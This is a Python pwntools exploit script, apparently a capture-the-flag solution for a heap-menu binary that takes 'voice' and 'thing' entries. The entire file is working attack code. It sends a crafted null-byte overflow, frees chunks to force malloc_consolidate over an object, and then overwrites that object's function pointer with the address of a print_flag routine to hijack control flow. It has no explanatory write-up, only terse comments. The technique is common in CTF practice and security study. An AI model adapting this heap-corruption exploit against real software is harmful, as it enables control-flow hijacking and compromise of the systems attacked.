import argparse
import random
from itertools import cycle
from pwn import *

parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote')
parser.add_argument('-p', '--port')
parser.add_argument('-e', '--elf', metavar="FILE")
parser.add_argument('-b', '--binary', metavar="FILE")
args = parser.parse_args()

context.terminal = '/bin/bash'
context.log_level = 'debug' # this is a brute wew


p = None # this is global process variable
e = None
b = None

if args.remote:
  if args.port is None:
    print(parser.print_help())
    exit()
  p = remote(args.remote, args.port) # TODO: add a remote service URI here
elif args.binary:
  context.binary = args.binary
  p = process(args.binary)
else:
  parser.print_help()
  exit()

if args.debugger:
  if args.remote:
    print("You can't attach a debugger to a remote process")
  else:
    gdb.attach(p) # if in vagrant just run gdb and attach it.


if args.elf:
  e = ELF(args.elf)

print_flag = 0x400b82

def make_string(index, size, data):
  p.recvuntil('voices!\n')
  p.sendline(str(1))
  p.recvuntil('one?\n')
  p.sendline(str(index))
  p.recvuntil('(voice/thing)\n')
  p.sendline('voice')
  p.recvuntil('be?\n')
  p.sendline(str(size))
  p.recvuntil('say?\n')
  p.send(data) # this HAS to be send

def make_thing(index):
  p.recvuntil('voices!\n')
  p.sendline(str(1))
  p.recvuntil('one?\n')
  p.sendline(str(index))
  p.recvuntil('(voice/thing)\n')
  p.sendline('thing')

def kill(index):
  p.recvuntil('voices!\n')
  p.sendline(str(2))
  p.recvuntil('one?\n')
  p.sendline(str(index))

make_string(0, 0xf8, 'A' * 0xf7)
make_string(1, 0x200, 'B' * 0x1f0 + p64(0x210)[:-1])
make_string(2, 0xf8, 'C' * 0xf7)
make_string(3, 0x80, 'D' * 0x7f)

kill(1)
kill(0)

make_string(0, 0xf8, 'E' * 0xf8) # to overflow the null byte
make_string(1, 0xf8, 'F' * 0xf7) # to get to a nice offset
make_thing(4)

kill(1)
kill(2) # this will trigger malloc_consolidate over the thing

make_string(1, 0xf8, 'G' * 0xf7)
make_string(2, 0x8, p64(print_flag)[:-1])

p.recvuntil('voices!\n')
p.sendline(str(3))
p.recvuntil('one?\n')
p.sendline(str(4))
print(p.recvline())